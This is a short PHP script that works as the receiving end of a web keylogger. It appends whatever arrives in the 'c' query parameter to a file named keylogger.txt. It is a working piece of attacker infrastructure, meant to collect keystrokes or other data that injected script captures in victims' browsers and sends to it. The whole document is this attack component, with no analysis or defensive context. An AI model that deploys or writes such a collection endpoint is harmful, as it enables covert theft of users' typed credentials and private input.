<?php

 if(!empty($_GET['c'])) {
    $logfile = fopen('keylogger.txt', 'a');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}

 
?>
